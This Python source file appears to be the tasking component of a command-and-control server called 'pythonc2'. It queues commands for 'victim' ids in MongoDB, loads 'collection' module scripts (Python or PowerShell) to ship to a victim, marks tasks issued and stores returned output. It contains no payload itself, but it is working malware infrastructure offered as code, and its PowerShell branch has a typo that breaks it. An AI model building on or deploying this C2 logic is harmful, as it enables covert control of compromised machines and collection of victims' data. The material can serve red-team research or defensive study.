import pdb
import os
import pathlib

class Task:

	mongoclient = None
	tasks = {}

	def __init__(self,victim_id,command,task_id,output=None,issued=False,add_db=True):

		self.task_id = task_id
		self.victim_id = victim_id
		self.command = command
		self.output = output
		self.issued = issued
		self.tasks[self.task_id] = self

		if add_db : self.insert_cmd_db()


	## Loads the first uninssued task in database
	@classmethod
	def find_unissued_task(cls,victim_id):
		mydb = cls.mongoclient["pythonc2"]
		tasks = mydb["tasks"]

		## Finding only the commands for this victim id and which hasn't been issued yet
		x = tasks.find_one({'victim_id': victim_id, 'issued':False})
		return x

	## Takes in pymongo task object, makes task objects.
	@classmethod
	def load_task(cls,task):
		
		task_obj = Task(victim_id = task['victim_id'], command = task['command'], task_id = task['task_id'], output = task['output'],issued = task['issued'],add_db = False)
		
		cls.tasks[task_obj.task_id] = task_obj

		return task_obj

	## Updates the whole task according to the current object state
	def update_task_to_db(self,attribute):
		mydb = self.mongoclient["pythonc2"]
		tasks = mydb["tasks"]

		h = {'task_id':self.task_id}
		
		tasks.find_one_and_update(h,{ "$set": {attribute : getattr(self,attribute)} })

	## Returns the task in a dictionary to be issued by the server
	def issue_dict(self):
		language = 'python'
		utility = 'collection'

		## Send command script to victim
		if language == 'python':
			module_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()), "../modules",language,utility,self.command+".py")
		else:
			module_path = os.path.join(tr(pathlib.Path(__file__).parent.resolve()), "../modules",language,utility,self.command+".ps1")

		f = open(module_path, "r")
		script = f.read()


		self.issued = True
		self.update_task_to_db('issued')
		return {'task_id': self.task_id, 'language': language, 'command': self.command, 'script': script}

	## Insert the command output in the Database
	def insert_cmd_output(self,output):
		self.output = output

		mydb = self.mongoclient["pythonc2"]
		tasks = mydb["tasks"]

		h = {'task_id':self.task_id}

		tasks.find_one_and_update(h,{ "$set": { "output": output } })

	## Inserts a command issued to a victim in the db
	def insert_cmd_db(self):
		
		mydb = self.mongoclient["pythonc2"]
		tasks = mydb["tasks"]

		h = {'task_id': self.task_id,'victim_id': self.victim_id, 'command':self.command, 'output':self.output ,'issued': self.issued}

		tasks.insert_one(h)